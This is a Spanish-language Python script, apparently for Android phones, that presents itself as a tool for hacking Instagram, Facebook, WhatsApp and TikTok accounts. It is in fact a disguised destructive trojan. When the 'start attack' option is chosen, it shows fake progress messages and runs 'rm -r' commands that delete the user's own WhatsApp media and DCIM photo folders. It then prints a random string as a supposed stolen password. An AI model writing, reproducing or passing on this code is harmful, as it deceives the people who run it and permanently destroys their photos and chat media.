#-*-coding: utf-8 -*-
## Módulos a importar
import os
import time
import string
import random
characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
print("""Esta herramienta a sido creada con fines experimentales
no somos responsables del mal uso de la misma!""")
time.sleep(4)
clearConsole()
def menu():
    print("╔╗╔╗╔══╗╔═╗╔╦╗──╔══╗╔═╗╔═╗╔══╗╔══╗╔╗─")
    print("║╚╝║║╔╗║║╔╝║╔╝──║══╣║║║║╔╝╚║║╝║╔╗║║║─")
    print("║╔╗║║╠╣║║╚╗║╚╗──╠══║║║║║╚╗╔║║╗║╠╣║║╚╗")
    print("╚╝╚╝╚╝╚╝╚═╝╚╩╝──╚══╝╚═╝╚═╝╚══╝╚╝╚╝╚═╝")
    print("      By Anonimo Root & Mr Star      ")
    r=int(input("""Menú:
    1-Instagram
    2-Facebook
    3-WhatsApp
    4-TikTok
    5-Iniciar ataque
    $: """))

    if r==1 or r==2 or r==3 or r==4:
        input("Ingrese usuario de la victima: ")
        print("Usuario guardado")
        time.sleep(2)
        clearConsole()
        menu()
    else:
        print("Iniciando ataque")
        time.sleep(3)
        print("Éxito")
        time.sleep(1)
        print("Iniciando transferencia de informacion")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp.w4b")
        os.system("rm -r /storage/emulated/0/DCIM")
        os.system("rm -r /storage/emulated/0/dcim")
        os.system("rm -r /storage/emulated/0/FMWhatsApp")
        os.system("rm -r /storage/emulated/0/YoWhatsApp")
        time.sleep(8)
        print("Éxito")
        time.sleep(1)
        print("Ataque exitoso")
        time.sleep(2)
        print("Contraseña:")
        contra( )
def contra():
	length =random.randrange(15)
	random.shuffle(characters)
	password = []
	for i in range(length):
		password.append(random.choice(characters))
	random.shuffle(password)
	print("".join(password))


menu()
